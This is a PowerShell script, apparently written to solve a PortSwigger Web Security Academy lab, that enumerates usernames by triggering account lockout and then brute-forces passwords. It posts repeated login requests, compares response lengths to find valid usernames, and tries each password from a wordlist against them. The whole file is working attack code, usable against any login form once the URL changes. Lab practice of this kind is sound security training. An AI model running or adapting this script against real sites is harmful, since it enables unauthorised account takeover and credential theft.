##Script represents the solvation of the enumeration via lock and wordbook attack to the password (Username enumeration via account lock).
#motivation - portswigger lab: https://portswigger.net/web-security/authentication
#Also the script wont do the work for you, it only minimize the possibilities of correct creds

$u="https://aca61f741e66d0c080af250f00b700cd.web-security-academy.net/login"
$ErrorActionPreference="SilentlyContinue"
$controll=(Invoke-WebRequest -uri $u -UseBasicParsing -Method POST -body "username=nieznamuzytkownika&password=haslateznieznam").RawContentLength
Write-Host $controll
#users enumeration
foreach($l in Get-Content .\users.txt){
    Write-Progress 'Enumerating Users...' ($l)
    $bd=@{
        username=$l
        password='nie wiem'
    }
    $i=5
    while($i){
        $r=(Invoke-WebRequest -uri $u -UseBasicParsing -Method POST -body $bd).RawContentLength
        $i=$i-1
    }
    if($r -ne $controll){
        Write-Host $r" possible username: $l"
        $controll2=(Invoke-WebRequest -uri $u -UseBasicParsing -Method POST -body "username=$l&password=haslateznieznam").RawContentLength
        $i=3
        foreach($z in Get-Content .\passwords.txt){
            Write-Progress 'Trying Password...' ($z)
            $bd2=@{
                username=$l
                password=$z
            }
 
            $r2=(Invoke-WebRequest -uri $u -UseBasicParsing -Method POST -body $bd2).RawContentLength
            if($r2 -ne $controll2){
            #Possible enthropy of the resp size.
                if($i -eq 0){
                Write-Host $r"Very possible username: $l password: $z"
                } else {
                Write-Host $r"It can be username: $l password: $z"
                }
                $i=$i-1
                
            }
    
        }
    }
    
}
pause